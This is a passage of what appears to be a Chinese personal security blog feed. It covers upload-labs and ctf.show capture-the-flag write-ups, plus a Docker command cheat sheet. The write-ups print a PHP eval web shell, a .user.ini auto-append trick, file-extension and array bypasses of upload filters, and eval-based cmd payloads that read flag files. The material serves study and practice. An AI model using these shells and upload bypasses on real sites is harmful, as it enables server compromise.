$this-&gt;cls_verbal == 0 ) return -5; else return &quot;The file could not be uploaded, a file with the same name already exists.&quot;;</span><br><span class="line">        break;</span><br><span class="line">      case &quot;MOVE_UPLOADED_FILE_FAILURE&quot; : if( $this-&gt;cls_verbal == 0 ) return -6; else return &quot;The file could not be uploaded, the file could not be copied to destination directory.&quot;;</span><br><span class="line">        break;</span><br><span class="line">      case &quot;RENAME_FAILURE&quot;           : if( $this-&gt;cls_verbal == 0 ) return 2; else return &quot;The file was uploaded but could not be renamed.&quot;;</span><br><span class="line">        break;</span><br><span class="line">      case &quot;SUCCESS&quot;                  : if( $this-&gt;cls_verbal == 0 ) return 1; else return &quot;Upload was successful!&quot;;</span><br><span class="line">        break;</span><br><span class="line">      default : echo &quot;OUPS!! We do not know what happen, you should fire the programmer ;)&quot;;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;; // end class</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码审计后，发现本题与上一题最大的区别，就是先于move()之前进行了后缀名白名单校验，然后再进行重命名。</p><p>那么在白名单影响下，就只能上传图片马了。网上搜索了一下，说这题要用apache解析漏洞来解决。</p><p>Apache服务器在解析多后缀文件名的文件时，会从后往前辨别后缀，一直辨别到可以解析的后缀：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php.x1.x3.x4.x5//比如这样，apache会先解析.x5后缀，发现这个后缀不可识别，于是解析.x4，一直从右往左推，直到遇到可识别的后缀，就以那个后缀的格式进行解析，这里会以.php的格式解析。</span><br></pre></td></tr></table></figure><p>不过我试了一下，发现自己的apache版本没有网上所描述的文件解析漏洞，所以先搁置了，以后再单独写一篇apache文件解析漏洞的博客研究一下。</p><p>而再这题中，网上的write up是写的.7z这个后缀不被apache解析，而它又存在于白名单内。</p><p>那么，当上传1.php.7z就会以1.php的形式解析，但上传后，文件会再move()函数后被重命名，这里就存在明显的条件竞争了。</p><p>上传1.php.7z，抓包，爆破10000次。</p><p>再访问1.php.7z，抓包，爆破10000次，就可以抓住文件上传后，但还未重命名的空隙访问，利用1.php.7z中的生成木马的语句，获得一个shell.php了，与上一题思路相同。</p><h4 id="Pass-20黑名单，点号绕过"><a href="#Pass-20黑名单，点号绕过" class="headerlink" title="Pass-20黑名单，点号绕过"></a>Pass-20黑名单，点号绕过</h4><h5 id="解题1-19"><a href="#解题1-19" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);<span class="comment">//取$file_name的后缀名</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pathinfo(path,process_sections) 返回一个关联数组包含有 path 的信息。</span><br><span class="line">path:检查路径</span><br><span class="line">process_sections:可选</span><br><span class="line">    PATHINFO_DIRNAME - 只返回 dirname</span><br><span class="line">    PATHINFO_BASENAME - 只返回 basename</span><br><span class="line">    PATHINFO_EXTENSION - 只返回 extension</span><br></pre></td></tr></table></figure><p>文件名靠自己输入，然后用pathinfo()函数来取后缀，进行黑名单过滤。</p><p>点号绕过即可：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220201144926170.png" alt="image-20220201144926170"></p><h4 id="Pass-21黑名单，点号绕过"><a href="#Pass-21黑名单，点号绕过" class="headerlink" title="Pass-21黑名单，点号绕过"></a>Pass-21黑名单，点号绕过</h4><h5 id="解题1-20"><a href="#解题1-20" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];<span class="comment">//如果POST递交的save_name为空，就是用上传文件的文件名</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;<span class="comment">//如果$file不是一个数组，就把$file转小写，并按&#x27;.&#x27;分割为数组</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);<span class="comment">//取后缀</span></span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);<span class="comment">//白名单数组</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;<span class="comment">//如果后缀名不在白名单内，禁止上传</span></span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];<span class="comment">//文件名加&#x27;.&#x27;加后缀构成$file_name</span></span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CTF题，如图，empty(save_name)为假就会用save_name，然后save_name是个数组，那么按照它的规则，$ext是jpg通过，文件名是test.php.上传</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220201150539639.png" alt="image-20220201150539639"></p><p>访问test.php.成功绕过：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220201152550674.png" alt="image-20220201152550674"></p>]]></content>
      
      
      <categories>
          
          <category> 1.靶场 </category>
          
          <category> 1.uploadlabs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker基础</title>
      <link href="/2021/11/18/Docker%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/11/18/Docker%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p>脚本安装与手动安装</p><p>Docker教程：<a href="https://www.runoob.com/docker/docker-tutorial.html">https://www.runoob.com/docker/docker-tutorial.html</a></p><h3 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h3><p>docker帮助</p><p>docker stats –help单个参数（stats）的具体使用方法</p><p>docker pull ubuntu下载镜像</p><p>docker run -it ubuntu &#x2F;bin&#x2F;bash以交互方式运行docker（-i：交互式，-t：终端，ubuntu：镜像，&#x2F;bin&#x2F;bash：执行的命令）</p><p>docker ps查看正在运行的容器</p><p>docker ps -a查看所有存在的容器</p><p>docker start name&#x2F;id根据名字或id启动一个已停止的容器</p><p>docker run -itd ……-d：后台运行</p><p>docker stop name&#x2F;id停止一个容器</p><p>docker restart name&#x2F;id重启容器</p><p>docker attach name&#x2F;id进入在后台运行的容器（用该命令进入容器exit后会导致容器停止）</p><p>docker exec -it name&#x2F;id &#x2F;bin&#x2F;bash进入在后台运行的容器（用该命令进入容器exit后只会退出，而不会停止容器）</p><p>docker export name&#x2F;id &gt; ubuntu.tar导出容器</p><p>cat docker&#x2F;ubuntu.tar | docker import - test&#x2F;ubuntu:v1从容器快照导入容器</p><p>docker import <a href="http://example.com/exampleimage.tgz">http://example.com/exampleimage.tgz</a> example&#x2F;imagerepo从URL或目录导入容器</p><p>docker rm -f name&#x2F;id强制删除容器</p><p>docker container prune清理所有处于终止状态的容器</p><p>docker rename oldname newname重命名容器</p><p>docker cp &#x2F;路径&#x2F;文件名 容器ID:&#x2F;上传路径传文件到docker</p><p>docker cp 容器ID:&#x2F;上传路径 &#x2F;路径&#x2F;文件名 从docker传文件到本地</p><h3 id="使用Docker创建一个WEB"><a href="#使用Docker创建一个WEB" class="headerlink" title="使用Docker创建一个WEB"></a>使用Docker创建一个WEB</h3><p>docker run -d -p 8081:5000 –name webapp-test1 training&#x2F;webapp python app.py使用创建一个webapp并从容器内部的5000端口映射到主机的8081端口（-P不带参数可以随机映射端口）</p><p>docker port name&#x2F;id查看容器映射的端口信息</p><p>docker logs -f name&#x2F;id查看容器运行日志（-f标准输出，类似于tail -f）</p><p>docker top name&#x2F;id查看容器内部运行的进程</p><p>docker inspect name&#x2F;id检查容器底层信息，记录着容器的配置和状态，json格式</p><p>docker ps -l查看最后一次创建的容器</p><h3 id="Docker镜像"><a href="#Docker镜像" class="headerlink" title="Docker镜像"></a>Docker镜像</h3><p>docker images列出本机所有镜像</p><p>docker search在网络上搜索镜像</p><p>docker rmi删除镜像</p><p>docker commit -m&#x3D;”has update” -a&#x3D;”runoob” name&#x2F;id runoob&#x2F;ubuntu:v2容器快照，将现有容器状态存为新的镜像（-m：提交的描述信息，-a：指定镜像作者，runoob&#x2F;ubuntu:v2镜像名）</p><p>docker tag name&#x2F;id xiaoluan&#x2F;ubuntu:target为镜像添加一个新的标签，一个镜像可以指定多个标签</p><h3 id="使用Docker创建一个MSSQL数据库"><a href="#使用Docker创建一个MSSQL数据库" class="headerlink" title="使用Docker创建一个MSSQL数据库"></a>使用Docker创建一个MSSQL数据库</h3><p>docker pull mcr.microsoft.com&#x2F;mssql&#x2F;server:2017-latest下载镜像</p><p>参考资料：<a href="https://www.jianshu.com/p/b1d9194900a2?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">https://www.jianshu.com/p/b1d9194900a2?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></p><p>docker run -e “ACCEPT_EULA&#x3D;Y” -e “SA_PASSWORD&#x3D;&lt;YourPassword!&gt;” -p 8001:1433 –name mssql1 -d mcr.microsoft.com&#x2F;mssql&#x2F;server:2017-latest运行mssql的docker容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-e &#x27;ACCEPT_EULA=Y&#x27; ：将 ACCEPT_EULA 变量设置为任意值，以确认接受最终用户许可协议。 SQL Server 映像的必需设置。</span><br><span class="line"></span><br><span class="line">-e &#x27;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&#x27; ：指定至少包含 8 个字符且符合 SQL Server 密码要求的强密码。 SQL Server 映像的必需设置。</span><br></pre></td></tr></table></figure><p>docker exec -it mssql1 &#x2F;opt&#x2F;mssql-tools&#x2F;bin&#x2F;sqlcmd -S localhost -U SA -P “&lt;YourPassword!&gt;” -Q ‘ALTER LOGIN SA WITH PASSWORD&#x3D;”&lt;YourPassword!&gt;”‘更改旧的SQL SERVER的SA密码</p><p>docker exec -it mssql1 “bash”与mssql容器交互</p><p>&#x2F;opt&#x2F;mssql-tools&#x2F;bin&#x2F;sqlcmd -S localhost -U SA -P “&lt;YourNewStrong!Passw0rd&gt;”调用sqlcmd登入mssql</p>]]></content>
      
      
      <categories>
          
          <category> 1.环境部署 </category>
          
          <category> 1.其他 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2021/10/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/10/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="题型（文件上传，代码审计）"><a href="#题型（文件上传，代码审计）" class="headerlink" title="题型（文件上传，代码审计）"></a>题型（文件上传，代码审计）</h4><h5 id="链接1"><a href="#链接1" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web13</p><h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"><span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>pathinfo(“&#x2F;testweb&#x2F;test.txt”) ：以数组的形式返回文件路径的信息，包括：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [dirname] =&gt; /testweb</span><br><span class="line">    [basename] =&gt; test.txt</span><br><span class="line">    [extension] =&gt; txt</span><br><span class="line">    [filename] =&gt; test</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>代码审计可知：程序要求上传文件大小不能超过24字节，文件名长度不得超过9，扩展名长度不得大于3，扩展名和文件名不能包含php，不能大小写绕过。</p><p>根据要求，可以上传.user.ini绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">要求：fastCGI</span><br><span class="line">auto_prepend_file=a.jpg //在页面顶部加载文件</span><br><span class="line">auto_append_file=a.jpg //在页面底部加载文件</span><br></pre></td></tr></table></figure><p>先上传.user.ini，文件内容是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=a.jpg</span><br></pre></td></tr></table></figure><p>再上传a.jpg，文件内容是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;]);</span><br></pre></td></tr></table></figure><p>最后用蚁剑连接，成功后发现没有读目录的权限，使用虚拟终端尝试执行命令，使用ls发现有一个903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php文件，cat此文件得到flag</p><span id="more"></span><hr>]]></content>
      
      
      <categories>
          
          <category> 1.CTF </category>
          
          <category> 1.日常练习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码执行</title>
      <link href="/2021/10/29/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/10/29/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h5 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h5><p>php代码执行，glob()返回符合匹配的文件名或目录名，highlight_file(“index.php”)返回网站源码</p><h5 id="链接1"><a href="#链接1" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web12</p><h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><p>看源码，有一个提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- hit:?cmd= --&gt;</span><br></pre></td></tr></table></figure><p>猜测程序存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_GET[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>可以构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=phpinfo();</span><br></pre></td></tr></table></figure><p>得到回显，再尝试echo system(“ls”);没有回显，猜测可能仅用了system()函数，尝试payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&quot;index.php&quot;)</span><br></pre></td></tr></table></figure><p>获得源代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web12&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web12&lt;/h2&gt;</span><br><span class="line">    &lt;h4&gt;where is the flag?&lt;/h4&gt;</span><br><span class="line">    &lt;!-- hit:?cmd= --&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">        eval($cmd);</span><br><span class="line">            ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>再构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print_r(glob(&quot;*&quot;));</span><br></pre></td></tr></table></figure><p>获得了当前目录下所有文件名：</p><p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20211029094142784.png" alt="image-20211029094142784"></p><p>查看903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php源码获得flag，payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;);</span><br></pre></td></tr></table></figure><span id="more"></span><hr><h5 id="题型-1"><a href="#题型-1" class="headerlink" title="题型"></a>题型</h5><p>php代码执行，echo的第二种写法：?&gt;&lt;?&#x3D;&#96;&#96;，PHP上传机制，source的第二种写法：. ，模糊匹配</p><h5 id="链接1-1"><a href="#链接1-1" class="headerlink" title="链接1"></a>链接1</h5><p><a href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; 红包题第二弹</p><p>参考资料：<a href="https://blog.csdn.net/qq_44657899/article/details/108011373">https://blog.csdn.net/qq_44657899/article/details/108011373</a></p><p>参考资料2：<a href="https://blog.51cto.com/u_15127652/4167408">https://blog.51cto.com/u_15127652/4167408</a></p><h5 id="解题1-1"><a href="#解题1-1" class="headerlink" 